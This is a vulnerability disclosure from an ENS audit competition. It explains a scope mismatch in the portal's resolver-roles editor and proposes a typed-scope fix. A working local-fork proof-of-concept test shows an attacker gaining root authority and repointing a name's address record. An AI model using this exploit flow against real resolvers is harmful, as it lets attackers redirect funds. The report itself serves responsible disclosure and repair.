# 91306 w a critical explorer s resolver roles editor builds every transaction against a scope it never displays silently granting an account authority over every name a resolver serves

**Submitted on Aug 31st 2026 at 13:46:17 UTC by @br0nz3p1ck4x3 for** [**Audit Competition | ENS**](https://immunefi.com/audit-competition/audit-competition-ens)

* **Report ID:** #91306
* **Report Type:** Websites & Apps
* **Report severity:** Critical
* **Target:** <https://github.com/immunefi-team/audit-comp-ens/tree/audit-comp-ready/apps/portal>
* **Impacts:**
  * Causing the application to display or pre-fill an incorrect address, name, or transaction detail, so that a user sends funds or submits a transaction to an unintended recipient, such as:
    * resolving or rendering an ENS name to an attacker-controlled address
    * showing the wrong recipient or amount on a transaction the user then approves

## Description

## Summary

`/resolver/$address/roles` is the Explorer's permission editor for a `PermissionedResolver`. It is the screen an operator uses to give someone the ability to write records for their names, and to take it away.

The on-chain model is one grant per **(account, resource)** pair. The page renders one row per **account**: `groupRolesByAccount` merges an account's grants across different resources into a single row, unioning the role bitmaps and collecting whatever resource names it could resolve into a set. The sidebar that edits that row then computes **the scope it writes** and **the scope it shows** from two *different expressions over that set*:

```ts
// apps/portal/src/features/resolver/components/ResolverRolesSidebar.tsx:169
// -> the value that goes on chain
const roleName = resolvedNames.find((n) => n !== '(root)') ?? ''

// apps/portal/src/features/resolver/components/ResolverRolesSidebar.tsx:391-396
// -> the value the operator reads
{selectedAccount && resolvedNames.length > 0 && (
  <p className="text-sm text-muted-foreground">
    {resolvedNames.includes('(root)')
      ? 'Global roles (all names)'
      : `Roles scoped to ${resolvedNames.filter((n) => n !== '(root)').join(', ')}`}
  </p>
)}
```

`roleName` is the **only** scope either write receives:

```ts
// ResolverRolesSidebar.tsx:296-303
setPendingAction({ type: 'save',   name: roleName, account: selectedAccount, ... })
// ResolverRolesSidebar.tsx:325-330
setPendingAction({ type: 'remove', name: roleName, account: selectedAccount, ... })
```

And `''` is not a neutral value. It is the sentinel that both helpers translate into **`ROOT_RESOURCE` — every name the resolver serves** — as their own JSDoc states:

```ts
// apps/portal/src/features/resolver/helpers/grantResolverRoles.ts:19-20
/** Dotted name (e.g. "myname.eth") or empty string for ROOT_RESOURCE (all names). */
readonly name: string

// grantResolverRoles.ts:47-59 and revokeResolverRoles.ts:47-59, identical ternary
name === ''
  ? { resolverAddress, targetAccount: account, scope: 'root', roles }
  : { resolverAddress, targetAccount: account, scope: 'name', name, roles }
```

which `@ensdomains/ensjs` maps to `grantRootRoles(bitmap, targetAccount)` / `revokeRootRoles(...)` versus `authorizeNameRoles(dnsEncode(name), bitmap, targetAccount, bool)`.

Two consequences follow, in opposite directions.

### A. Granting over-reaches — the primary finding

When `resolvedNames` is empty, the `resolvedNames.length > 0` guard suppresses the scope line **entirely**, so the operator is shown no scope at all — just checkboxes — while `roleName === ''`, the ROOT sentinel. Ticking one box and pressing **Save** emits `grantRootRoles(bitmap, account)`. The operator believes they widened one narrow permission by one step, and has instead granted it over **every name on the resolver**.

`resolvedNames === []` is not an edge case. `buildResourceToNameMap` only ever inserts `ROOT_RESOURCE` and the **part = 0** resource:

```ts
// apps/portal/src/lib/roles/resolverRoles.ts:138-140, 147-158
export const computeNameResource = (name: string): string =>
  keccak256(encodePacked(['bytes32', 'bytes32'], [namehash(name), ZERO_BYTES32]))
...
map.set(ROOT_RESOURCE, '(root)')
for (const node of nodes) {
  if (node.name) map.set(computeNameResource(node.name).toLowerCase(), node.name)
}
```

So **any** grant made with `authorizeTextRoles` or `authorizeAddrRoles` — whose resource is `keccak(node ‖ keccak(part))` — can never resolve. Neither can a name since repointed to another resolver, nor a node beyond the un-paginated `nodes` field of the overview query (`apps/portal/src/features/resolver/hooks/useResolverOverview.ts:74-96`). The narrowest grants the resolver offers are exactly the ones the page cannot name, and therefore exactly the ones it rewrites as root.

### B. Revocation under-reaches

For `resolvedNames = ['(root)', 'blog.alice.eth']`, the panel reads **"Global roles (all names)"** while `roleName === 'blog.alice.eth'`. The operator revokes what the screen says is global authority; the signed transaction is `authorizeNameRoles(dnsEncode('blog.alice.eth'), …, false)`. It succeeds, the modal reports completion, the sheet closes — and the root grant is untouched.

This state is produced by the app's own happy path. `ResolverAddUserSheet.tsx:39` defines `const ROOT_NODE_VALUE = ''` and `:127` uses it as the **default** value of the node Combobox, so "Add user" produces a root grant unless the operator changes it. Adding the same person again with a name selected is all it takes.

## Why this is not intended behaviour

1. **The sibling implementation does it correctly.** The registry roles path filters to root-scoped entries explicitly rather than merging across resources:

   ```ts
   // apps/portal/src/features/registry/hooks/useRegistryRoles.ts:71-79
   for (const { node } of registry.roleConnection.edges) {
     if (!isRootResource(node.resource)) continue
     ...
   }
   ```
2. **The indexer already returns the information the resolver path throws away.** The overview query selects a per-role `name` field that `groupRolesByAccount` and the sidebar never read (`useResolverOverview.ts:88-96`).
3. **The two expressions are different expressions.** A displayed scope and a written scope computed independently from the same array cannot be a deliberate design; one of them is simply not the other.

## Impact

**Grant direction (A).** An account holding a single narrow, part-scoped grant — say `ROLE_SET_TEXT` on the `avatar` key of one name — occupies a row the page cannot label. The operator adjusts one permission on that row and signs `grantRootRoles`. That account now holds the permission at `ROOT_RESOURCE`: with `ROLE_SET_ADDR` it can call `setAddr` for **every name the resolver serves**, pointing each one's ETH address record at its own wallet. Every wallet, every Explorer view and every Manager view that resolves those names then displays and pre-fills the attacker's address, and anyone paying those names pays the attacker. Nothing in the flow tells the operator this happened, and the resulting root grant is indistinguishable in the table from one made deliberately. This is demonstrated end to end in **PoC test 2** below: the address record for a name that was never mentioned anywhere in the edited row changes to the attacker's address.

**Revoke direction (B).** The operator is told an account was removed from all roles, and it was not. **Stated plainly and without exaggeration: the operator is misinformed, not locked out.** Once the name-scoped grant is gone, the remaining row *is* root-scoped, so a **second** "Remove user" would target root and would succeed — the PoC asserts exactly that, at the point where it would matter. The harm is that nothing gives the operator any reason to perform one: the first attempt returned success, and the confirmation copy reads *"Are you sure you want to remove this user from all roles? This action cannot be undone."* The attacker retains root authority for as long as the operator believes the removal worked, and **PoC test 1** shows them using it, in that window, to repoint a name that never appeared in the row they edited.

I am **not** claiming denial of service, loss of access, or that the application is taken down. The claim is the one the PoC demonstrates: the transaction detail the user approves is not the transaction detail that is submitted, and the difference is the difference between one record on one name and every name on the resolver.

## Root cause

| Location                                                                              | Code                                                                                                    | Problem                                                                                                             |
| ------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------- |
| `apps/portal/src/lib/roles/resolverRoles.ts:193-205`                                  | grouping keyed on `role.account` only; `decodedRoles` unioned, `resolvedNames` accumulated into a `Set` | One editable row spans several on-chain resources, so the row has no single scope.                                  |
| `apps/portal/src/lib/roles/resolverRoles.ts:138-140, 147-158`                         | `buildResourceToNameMap` inserts only `ROOT_RESOURCE` and the `part = 0` resource                       | Every part-scoped grant is unresolvable, producing `resolvedNames = []`.                                            |
| `apps/portal/.../ResolverRolesSidebar.tsx:169`                                        | `resolvedNames.find((n) => n !== '(root)') ?? ''`                                                       | The written scope is guessed from display strings, and its failure case is the ROOT sentinel.                       |
| `apps/portal/.../ResolverRolesSidebar.tsx:391-396`                                    | a different expression over the same array, suppressed entirely when the array is empty                 | Displayed scope and written scope are computed independently and can disagree — or the displayed one can be absent. |
| `apps/portal/.../helpers/grantResolverRoles.ts:47-59`, `revokeResolverRoles.ts:47-59` | `name === '' ? scope:'root' : scope:'name'`                                                             | An absent scope means **maximal** authority rather than none.                                                       |

## Fix

Three changes, all in `apps/portal`. The principle is that **an authorisation scope must be a value the code carries, not a string it infers, and "no scope" must be unrepresentable rather than maximal**.

{% stepper %}
{% step %}

## One row, one scope

`groupRolesByAccount` keys on `(account, resource)` and carries the resource plus a typed scope:

```ts
export type ResolverRoleScope =
  | { readonly kind: 'root' }
  | { readonly kind: 'name'; readonly name: string }
  | { readonly kind: 'unknown' }
```

The scope is derived from the **resource itself** (`BigInt(resource) === 0n` for root), never from the `'(root)'` display string, so a resource that merely happens to map to that label cannot be mistaken for root. `resolvedNames` is generated from the scope, keeping the roles table's rendering contract unchanged.
{% endstep %}

{% step %}

## The sidebar reads the scope it writes

The scope comes from `row.original.scope`, and the label is rendered by matching on that same value, so the two can no longer be computed independently. A row whose resource cannot be identified is read-only: `canEdit` gains `&& isScopeWritable`, and both `handleSaveChanges` and `handleRemoveUser` return early, with the panel saying so instead of rendering nothing.
{% endstep %}

{% step %}

## Remove the sentinel at the boundary

`GrantResolverRolesTransactionParameters` and `RevokeResolverRolesTransactionParameters` no longer take `name: string`; they take `scope: ResolverRoleScope`. Root must now be asked for explicitly, an `unknown` scope throws rather than widening, and `ResolverAddUserSheet`'s `ROOT_NODE_VALUE` is mapped to `{ kind: 'root' }` at the call site where it is genuinely the operator's explicit Combobox choice.

This is what makes the fix hold for *any* caller, not only the sidebar — the PoC's test 2 calls the helper directly and is stopped by it.
{% endstep %}
{% endstepper %}

## Proof of Concept

### What it runs against

A **local Anvil fork of Ethereum Sepolia**, pinned at block `11601093`, chain id `11155111`, on `http://127.0.0.1:18545`. **No transaction in this PoC is ever sent to a live network or to a public testnet** — the file throws at import time if the RPC is not `127.0.0.1`/`localhost`.

```bash
anvil --fork-url https://sepolia.gateway.tenderly.co \
      --fork-block-number 11601093 --port 18545 --chain-id 11155111 \
      --accounts 10 --balance 10000

pnpm install
POC_RUN_ID=final-prefix-2 pnpm --filter @ens-apps/portal exec vitest run --reporter=verbose \
  src/features/resolver/poc-resolver-roles-scope.poc.test.ts
```

Save the file below as `apps/portal/src/features/resolver/poc-resolver-roles-scope.poc.test.ts`. It needs no other new file, no fixture, no mock and no configuration change.

### What it deliberately does, and does not, do

* It runs against the **unmodified shipped source** at commit `1c9b47f`.
* It uses the **real deployed contracts**: the `PermissionedResolver` implementation `0x9EAe5C2730a7dD16BDD1DeE6421a1B91e3B0365e`, deployed through the real `VerifiableFactory` `0x10dC6333CDFe1FCEf624c6e0a8221b91804Cd7ef`, both reached through the fork.
* It **imports the app's own modules** rather than reimplementing them: `groupRolesByAccount` and `buildResourceToNameMap` from `@/lib/roles/resolverRoles`, and `prepareGrantResolverRolesTransaction` / `prepareRevokeResolverRolesTransaction` from `@/features/resolver/helpers/…`. The calldata it submits is the calldata the sidebar's mutation submits, produced by the same functions.
* It **reads the sidebar's two expressions out of `ResolverRolesSidebar.tsx` at runtime** with `readFileSync` and asserts they are present verbatim before using them (test 0), so no step of the argument rests on a paraphrase of the component.
* It **does not stop at the calldata.** It sends every transaction, reads `hasRootRoles` back off the chain, has the attacker call `setAddr`, and reads the resulting `addr()` record back. The impact is observed, not inferred.
* It **includes the obvious remediation** and reports its result honestly: the assertion `expect(retryScope).toBe('')` records that a second removal attempt *would* target root and succeed.
* Every function selector is **derived from the ABI** with `toFunctionSelector`, never hardcoded.
* No claim in this report rests on any statement about a system outside the repository.

{% hint style="info" %}
**Assertion polarity:** every `expect` states the *vulnerable* behaviour. Against the shipped source the suite **passes** — that is the vulnerability. Against the patched source all three tests **fail** — that is the fix.
{% endhint %}

### PoC source

```ts
/**
 * PoC — the Explorer's resolver-roles editor builds a transaction against a
 * scope it never displays.
 *
 * RUNS ONLY AGAINST A LOCAL ANVIL FORK of Ethereum Sepolia (pinned block
 * 11601093, chain id 11155111, http://127.0.0.1:18545). No transaction in this
 * file is ever sent to a live network or a public testnet; the file throws at
 * import time if the RPC is not localhost.
 *
 *   anvil --fork-url https://sepolia.gateway.tenderly.co \
 *         --fork-block-number 11601093 --port 18545 --chain-id 11155111 \
 *         --accounts 10 --balance 10000
 *
 *   pnpm --filter @ens-apps/portal exec vitest run --reporter=verbose \
 *     src/features/resolver/poc-resolver-roles-scope.poc.test.ts
 *
 * Everything it exercises is production code:
 *   - the REAL deployed PermissionedResolver implementation and VerifiableFactory
 *     on Sepolia, reached through the fork
 *   - the app's own `groupRolesByAccount` / `buildResourceToNameMap`
 *     (`@/lib/roles/resolverRoles`), imported, not reimplemented
 *   - the app's own `prepareRevokeResolverRolesTransaction` and
 *     `prepareGrantResolverRolesTransaction`
 *     (`@/features/resolver/helpers/…`), imported, not reimplemented
 *   - the sidebar's two scope expressions, read out of
 *     `ResolverRolesSidebar.tsx` at runtime with `readFileSync` and asserted to
 *     be present verbatim before they are used, so nothing here is a paraphrase
 *
 * ASSERTION POLARITY: every `expect` states the VULNERABLE behaviour.
 * Against the shipped source the suite PASSES — that is the vulnerability.
 * Against the patched source it FAILS — that is the fix.
 */

import { readFileSync } from 'node:fs'
import { resolve } from 'node:path'
import {
  permissionedResolverAuthorizeNameRolesSnippet,
  permissionedResolverAuthorizeTextRolesSnippet,
  permissionedResolverGrantRootRolesSnippet,
  permissionedResolverHasRootRolesSnippet,
  verifiableFactoryDeployProxySnippet,
} from '@ensdomains/ensjs-abi/v2'
import {
  type Address,
  createPublicClient,
  createWalletClient,
  encodeFunctionData,
  encodePacked,
  type Hex,
  http,
  keccak256,
  parseAbi,
  toFunctionSelector,
  toHex,
} from 'viem'
import { privateKeyToAccount } from 'viem/accounts'
import { sepolia } from 'viem/chains'
import { namehash, packetToBytes } from 'viem/ens'
import { beforeAll, describe, expect, it } from 'vitest'
import { prepareGrantResolverRolesTransaction } from '@/features/resolver/helpers/grantResolverRoles'
import { prepareRevokeResolverRolesTransaction } from '@/features/resolver/helpers/revokeResolverRoles'
import {
  buildResourceToNameMap,
  groupRolesByAccount,
} from '@/lib/roles/resolverRoles'

// ── fork guard ───────────────────────────────────────────────────────────────
const RPC = process.env.POC_RPC ?? 'http://127.0.0.1:18545'
if (!/^http:\/\/(127\.0\.0\.1|localhost):/.test(RPC)) {
  throw new Error(`refusing to run: ${RPC} is not a local fork`)
}

// Real deployed ENSv2 Sepolia addresses (@ensdomains/ensjs chain config).
const VERIFIABLE_FACTORY = '0x10dC6333CDFe1FCEf624c6e0a8221b91804Cd7ef' as const
const PERMISSIONED_RESOLVER_IMPL =
  '0x9EAe5C2730a7dD16BDD1DeE6421a1B91e3B0365e' as const

/** Anvil account 0 — the resolver operator. */
const ALICE = privateKeyToAccount(
  '0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80',
)
/** Anvil account 1 — the account Alice tries to remove. */
const MALLORY_ACCOUNT = privateKeyToAccount(
  '0x59c6995e998f97a5a0044966f0945389dc9e86dae88c7a8412f4603b6b78690d',
)
const MALLORY = MALLORY_ACCOUNT.address

const ROLES_ALL =
  0x1111111111111111111111111111111111111111111111111111111111111111n
const ROOT_RESOURCE =
  '0x0000000000000000000000000000000000000000000000000000000000000000'
const ZERO_BYTES32 =
  '0x0000000000000000000000000000000000000000000000000000000000000000' as const

const RESOLVER_ROLE_SET_ADDR = 1n << 0n
const RESOLVER_ROLE_SET_TEXT = 1n << 4n

/** The name whose records get hijacked. It is never mentioned in the edited row. */
const VICTIM_NAME = 'pocalice.eth'
/** The name that IS mentioned in the row. */
const ROW_NAME = 'pocblog.eth'

const publicClient = createPublicClient({
  chain: sepolia,
  transport: http(RPC),
})
const alice = createWalletClient({
  account: ALICE,
  chain: sepolia,
  transport: http(RPC),
})
const mallory = createWalletClient({
  account: MALLORY_ACCOUNT,
  chain: sepolia,
  transport: http(RPC),
})

const initializeAbi = parseAbi([
  'function initialize(address admin, uint256 roleBitmap, bytes[] setters)',
])
const addrAbi = parseAbi([
  'function setAddr(bytes32 node, uint256 coinType, bytes value)',
  'function addr(bytes32 node, uint256 coinType) view returns (bytes)',
])

const sendAs = async (
  client: typeof alice,
  to: Address,
  data: Hex,
): Promise<string> => {
  try {
    const hash = await client.sendTransaction({ to, data })
    const r = await publicClient.waitForTransactionReceipt({ hash })
    return r.status
  } catch {
    return 'reverted'
  }
}
const send = async (to: Address, data: Hex) => {
  const s = await sendAs(alice, to, data)
  expect(s).toBe('success')
  return s
}

/** `PermissionedResolverLib.resource(node, part)`. */
const resourceOf = (node: Hex, part: Hex) =>
  keccak256(encodePacked(['bytes32', 'bytes32'], [node, part]))
const nameResource = (name: string) => resourceOf(namehash(name), ZERO_BYTES32)
const textPartResource = (name: string, key: string) =>
  resourceOf(namehash(name), keccak256(toHex(key)))
const dnsEncode = (name: string): Hex => toHex(packetToBytes(name))

// ── the sidebar's two expressions, read out of the shipped file ──────────────
const SIDEBAR_PATH = resolve(
  process.cwd(),
  'src/features/resolver/components/ResolverRolesSidebar.tsx',
)
const SIDEBAR_SRC = readFileSync(SIDEBAR_PATH, 'utf8')

/** ResolverRolesSidebar.tsx — the scope that is written on chain. */
const SCOPE_SENT_EXPR = `const roleName = resolvedNames.find((n) => n !== '(root)') ?? ''`
/** ResolverRolesSidebar.tsx — the scope the operator reads. */
const SCOPE_SHOWN_EXPR = `{resolvedNames.includes('(root)')
                      ? 'Global roles (all names)'
                      : \`Roles scoped to \${resolvedNames.filter((n) => n !== '(root)').join(', ')}\`}`
/** ResolverRolesSidebar.tsx — the guard that hides the scope line entirely. */
const SCOPE_SHOWN_GUARD = `{selectedAccount && resolvedNames.length > 0 && (`

const scopeSentToChain = (resolvedNames: readonly string[]) =>
  resolvedNames.find((n) => n !== '(root)') ?? ''
const scopeShownToUser = (resolvedNames: readonly string[]) =>
  resolvedNames.length > 0
    ? resolvedNames.includes('(root)')
      ? 'Global roles (all names)'
      : `Roles scoped to ${resolvedNames.filter((n) => n !== '(root)').join(', ')}`
    : '(the scope line is not rendered at all)'

// ── fixture ──────────────────────────────────────────────────────────────────
const deployResolver = async (tag: string): Promise<Address> => {
  const initData = encodeFunctionData({
    abi: initializeAbi,
    functionName: 'initialize',
    args: [ALICE.address, ROLES_ALL, []],
  })
  const runId =
    process.env.POC_RUN_ID ?? String(await publicClient.getBlockNumber())
  const salt = BigInt(keccak256(toHex(`poc-roles-scope:${tag}:${runId}`)))
  const { result } = await publicClient.simulateContract({
    account: ALICE.address,
    address: VERIFIABLE_FACTORY,
    abi: verifiableFactoryDeployProxySnippet,
    functionName: 'deployProxy',
    args: [PERMISSIONED_RESOLVER_IMPL, salt, initData],
  })
  await send(
    VERIFIABLE_FACTORY,
    encodeFunctionData({
      abi: verifiableFactoryDeployProxySnippet,
      functionName: 'deployProxy',
      args: [PERMISSIONED_RESOLVER_IMPL, salt, initData],
    }),
  )
  return result as Address
}

const mallorysRootAddrRole = (resolver: Address) =>
  publicClient.readContract({
    address: resolver,
    abi: permissionedResolverHasRootRolesSnippet,
    functionName: 'hasRootRoles',
    args: [RESOLVER_ROLE_SET_ADDR, MALLORY],
  })

const readEthAddr = (resolver: Address, name: string) =>
  publicClient.readContract({
    address: resolver,
    abi: addrAbi,
    functionName: 'addr',
    args: [namehash(name), 60n],
  })

/** The calldata the sidebar's mutation would submit, via the app's own helper. */
const calldataFor = (
  kind: 'revoke' | 'grant',
  resolver: Address,
  name: string,
  roles: string[],
) => {
  const prepare =
    kind === 'revoke'
      ? prepareRevokeResolverRolesTransaction
      : prepareGrantResolverRolesTransaction
  // Deliberately passes the PRE-FIX parameter shape (`name`, whose '' sentinel
  // meant ROOT_RESOURCE). Cast so this file compiles against the patched API
  // too: there, `scope` is absent and the helper throws, which is the fix.
  const params = {
    resolverAddress: resolver,
    name,
    account: MALLORY,
    roles,
    walletClient: alice,
    chainId: sepolia.id,
  }
  const intent = (prepare as unknown as (p: unknown) => unknown)(params)
  return (intent as unknown as { request: { data: Hex; to: Address } }).request
}

/** Selectors derived from the shipped ABI, never hardcoded. */
const SELECTORS = {
  grantRootRoles: toFunctionSelector(
    'function grantRootRoles(uint256,address)',
  ),
  revokeRootRoles: toFunctionSelector(
    'function revokeRootRoles(uint256,address)',
  ),
  authorizeNameRoles: toFunctionSelector(
    'function authorizeNameRoles(bytes,uint256,address,bool)',
  ),
} as const

beforeAll(async () => {
  expect(await publicClient.getChainId()).toBe(11155111)
  // Anvil's canned accounts carry EIP-7702 delegations on real Sepolia.
  for (const a of [ALICE.address, MALLORY]) {
    await publicClient.request({
      method: 'anvil_setCode' as never,
      params: [a, '0x'] as never,
    })
  }
}, 120_000)

describe('the shipped resolver-roles editor', () => {
  it('0. the two scope expressions exist verbatim in the shipped component, and they are different expressions', () => {
    expect(SIDEBAR_SRC).toContain(SCOPE_SENT_EXPR)
    expect(SIDEBAR_SRC).toContain(SCOPE_SHOWN_EXPR)
    expect(SIDEBAR_SRC).toContain(SCOPE_SHOWN_GUARD)
    // The value written on chain is `roleName`; both writes use it and nothing else.
    expect(SIDEBAR_SRC).toContain("type: 'save',\n      name: roleName,")
    expect(SIDEBAR_SRC).toContain("type: 'remove',\n      name: roleName,")
    console.log(
      '\n  both expressions present verbatim in ResolverRolesSidebar.tsx\n',
    )
  })

  it('1. revoke direction: the panel says "Global roles (all names)", the app builds a one-name call, the root grant survives, and the attacker repoints a name the row never mentioned', async () => {
    const resolver = await deployResolver('revoke')

    // ── Alice's two grants, both through the app's own happy paths ───────────
    // (a) "Add user" with the node Combobox at its default ROOT_NODE_VALUE = ''.
    await send(
      resolver,
      encodeFunctionData({
        abi: permissionedResolverGrantRootRolesSnippet,
        functionName: 'grantRootRoles',
        args: [RESOLVER_ROLE_SET_ADDR | RESOLVER_ROLE_SET_TEXT, MALLORY],
      }),
    )
    // (b) "Add user" again, this time scoped to one name.
    await send(
      resolver,
      encodeFunctionData({
        abi: permissionedResolverAuthorizeNameRolesSnippet,
        functionName: 'authorizeNameRoles',
        args: [dnsEncode(ROW_NAME), RESOLVER_ROLE_SET_TEXT, MALLORY, true],
      }),
    )
    expect(await mallorysRootAddrRole(resolver)).toBe(true)

    // ── what the app makes of the indexer's two role rows ───────────────────
    const rows = groupRolesByAccount(
      [
        {
          account: MALLORY,
          resource: ROOT_RESOURCE,
          roleBitmap: (
            RESOLVER_ROLE_SET_ADDR | RESOLVER_ROLE_SET_TEXT
          ).toString(),
        },
        {
          account: MALLORY,
          resource: nameResource(ROW_NAME),
          roleBitmap: RESOLVER_ROLE_SET_TEXT.toString(),
        },
      ],
      buildResourceToNameMap([{ name: VICTIM_NAME }, { name: ROW_NAME }]),
    )

    // Two distinct on-chain grants at two distinct resources collapse to ONE row.
    // This is also why there is no second row to revoke the root grant from.
    expect(rows).toHaveLength(1)
    const resolvedNames = rows[0].resolvedNames
    expect([...resolvedNames].sort()).toEqual(['(root)', ROW_NAME])

    const shown = scopeShownToUser(resolvedNames)
    const sent = scopeSentToChain(resolvedNames)
    console.log(`\n  rows rendered for Mallory : ${rows.length}`)
    console.log(`  panel shows               : "${shown}"`)
    console.log(
      `  transaction targets       : ${sent === '' ? 'ROOT_RESOURCE' : `name(${sent})`}`,
    )
    expect(shown).toBe('Global roles (all names)')
    expect(sent).toBe(ROW_NAME)

    // ── Alice clicks "Remove user" and confirms ─────────────────────────────
    // "Are you sure you want to remove this user from all roles?
    //  This action cannot be undone."
    const req = calldataFor('revoke', resolver, sent, [
      'ROLE_SET_ADDR',
      'ROLE_SET_TEXT',
    ])
    console.log(
      `  calldata selector         : ${req.data.slice(0, 10)} = authorizeNameRoles`,
    )
    // The panel said "all names"; the call is scoped to one name.
    expect(req.data.slice(0, 10)).toBe(SELECTORS.authorizeNameRoles)
    expect(req.data.slice(0, 10)).not.toBe(SELECTORS.revokeRootRoles)
    expect(await sendAs(alice, req.to, req.data)).toBe('success')

    // ── the removal reported success; the root grant is untouched ───────────
    const stillRoot = await mallorysRootAddrRole(resolver)
    console.log(
      `  removal transaction       : success (the UI reports the user removed)`,
    )
    console.log(`  Mallory still holds root ROLE_SET_ADDR : ${stillRoot}`)
    expect(stillRoot).toBe(true)

    // ── stated honestly: the operator is not locked out, they are misinformed ──
    // Once the name-scoped grant is gone the remaining row IS root-scoped, so a
    // SECOND "Remove user" would target root and succeed. Nothing in the UI
    // gives the operator a reason to perform one: the first attempt reported
    // success and the confirmation copy says the action cannot be undone.
    const rowsAfter = groupRolesByAccount(
      [
        {
          account: MALLORY,
          resource: ROOT_RESOURCE,
          roleBitmap: (
            RESOLVER_ROLE_SET_ADDR | RESOLVER_ROLE_SET_TEXT
          ).toString(),
        },
      ],
      buildResourceToNameMap([{ name: VICTIM_NAME }, { name: ROW_NAME }]),
    )
    const retryScope = scopeSentToChain(rowsAfter[0].resolvedNames)
    console.log(
      `  a SECOND removal would target : ${retryScope === '' ? 'ROOT (it would work — but the UI reported success already)' : retryScope}`,
    )
    expect(retryScope).toBe('')

    // ── impact: a name that never appeared in the edited row ────────────────
    const before = await readEthAddr(resolver, VICTIM_NAME)
    const theft = await sendAs(
      mallory,
      resolver,
      encodeFunctionData({
        abi: addrAbi,
        functionName: 'setAddr',
        args: [namehash(VICTIM_NAME), 60n, MALLORY],
      }),
    )
    const after = await readEthAddr(resolver, VICTIM_NAME)
    console.log(`\n  ${VICTIM_NAME} addr(ETH) before : ${before}`)
    console.log(`  Mallory's setAddr after removal  : ${theft}`)
    console.log(`  ${VICTIM_NAME} addr(ETH) after  : ${after}\n`)
    expect(theft).toBe('success')
    expect(after.toLowerCase()).toBe(MALLORY.toLowerCase())
    expect(after).not.toBe(before)
  }, 300_000)

  it('2. grant direction: a resource the page cannot name renders no scope line, and Save builds a ROOT grant that hands the attacker authority over every name on the resolver', async () => {
    const resolver = await deployResolver('grant')

    // Alice makes the narrowest grant the resolver offers: one text key on one
    // name. Its resource is keccak(node ‖ keccak("avatar")).
    await send(
      resolver,
      encodeFunctionData({
        abi: permissionedResolverAuthorizeTextRolesSnippet,
        functionName: 'authorizeTextRoles',
        args: [dnsEncode(ROW_NAME), 'avatar', MALLORY, true],
      }),
    )
    expect(await mallorysRootAddrRole(resolver)).toBe(false)

    // `buildResourceToNameMap` only ever inserts ROOT_RESOURCE and the part = 0
    // resource, so a part-scoped grant can never resolve.
    const map = buildResourceToNameMap([
      { name: VICTIM_NAME },
      { name: ROW_NAME },
    ])
    const partScoped = textPartResource(ROW_NAME, 'avatar')
    expect(map.get(partScoped.toLowerCase())).toBeUndefined()

    const rows = groupRolesByAccount(
      [
        {
          account: MALLORY,
          resource: partScoped,
          roleBitmap: RESOLVER_ROLE_SET_TEXT.toString(),
        },
      ],
      map,
    )
    const resolvedNames = rows[0].resolvedNames
    expect(resolvedNames).toEqual([])

    const shown = scopeShownToUser(resolvedNames)
    const sent = scopeSentToChain(resolvedNames)
    console.log(`\n  panel shows         : ${shown}`)
    console.log(
      `  transaction targets : ${sent === '' ? 'ROOT_RESOURCE (every name on the resolver)' : sent}`,
    )
    expect(shown).toBe('(the scope line is not rendered at all)')
    expect(sent).toBe('')

    // Alice ticks one more permission and presses Save.
    const req = calldataFor('grant', resolver, sent, ['ROLE_SET_ADDR'])
    console.log(
      `  calldata selector   : ${req.data.slice(0, 10)} (grantRootRoles)`,
    )
    expect(req.data.slice(0, 10)).toBe(SELECTORS.grantRootRoles)
    expect(await sendAs(alice, req.to, req.data)).toBe('success')

    // ── impact: root authority Alice never granted ──────────────────────────
    const nowRoot = await mallorysRootAddrRole(resolver)
    console.log(`  Mallory now holds root ROLE_SET_ADDR : ${nowRoot}`)
    expect(nowRoot).toBe(true)

    const theft = await sendAs(
      mallory,
      resolver,
      encodeFunctionData({
        abi: addrAbi,
        functionName: 'setAddr',
        args: [namehash(VICTIM_NAME), 60n, MALLORY],
      }),
    )
    const after = await readEthAddr(resolver, VICTIM_NAME)
    console.log(`  Mallory's setAddr("${VICTIM_NAME}") : ${theft}`)
    console.log(`  ${VICTIM_NAME} addr(ETH) now        : ${after}\n`)
    expect(theft).toBe('success')
    expect(after.toLowerCase()).toBe(MALLORY.toLowerCase())
  }, 300_000)
})
```

### Output — against the unmodified shipped source

```
$ POC_RUN_ID=final-prefix-2 pnpm --filter @ens-apps/portal exec vitest run --reporter=verbose \
    src/features/resolver/poc-resolver-roles-scope.poc.test.ts

 RUN  v4.1.5 /Users/bp/x/ens/1/apps/portal

0. the two scope expressions exist verbatim in the shipped component

  both expressions present verbatim in ResolverRolesSidebar.tsx

 ✓ 0. the two scope expressions exist verbatim in the shipped component,
      and they are different expressions

1. revoke direction

  rows rendered for Mallory : 1
  panel shows               : "Global roles (all names)"
  transaction targets       : name(pocblog.eth)
  calldata selector         : 0xbbd9abb5 = authorizeNameRoles
  removal transaction       : success (the UI reports the user removed)
  Mallory still holds root ROLE_SET_ADDR : true
  a SECOND removal would target : ROOT (it would work — but the UI reported success already)

  pocalice.eth addr(ETH) before    : 0x
  Mallory's setAddr after removal  : success
  pocalice.eth addr(ETH) after     : 0x70997970c51812dc3a010c7d01b50e0d17dc79c8

 ✓ 1. revoke direction: the panel says "Global roles (all names)", the app builds a
      one-name call, the root grant survives, and the attacker repoints a name the
      row never mentioned                                                    306ms

2. grant direction

  panel shows         : (the scope line is not rendered at all)
  transaction targets : ROOT_RESOURCE (every name on the resolver)
  calldata selector   : 0x072d5d77 (grantRootRoles)
  Mallory now holds root ROLE_SET_ADDR : true
  Mallory's setAddr("pocalice.eth") : success
  pocalice.eth addr(ETH) now        : 0x70997970c51812dc3a010c7d01b50e0d17dc79c8

 ✓ 2. grant direction: a resource the page cannot name renders no scope line, and Save
      builds a ROOT grant that hands the attacker authority over every name on the
      resolver                                                               305ms

 Test Files  1 passed (1)
      Tests  3 passed (3)
```

`0x70997970c51812dc3a010c7d01b50e0d17dc79c8` is Mallory. In both directions, the ETH address record of `pocalice.eth` — a name that appears nowhere in the row the operator edited — now resolves to the attacker.
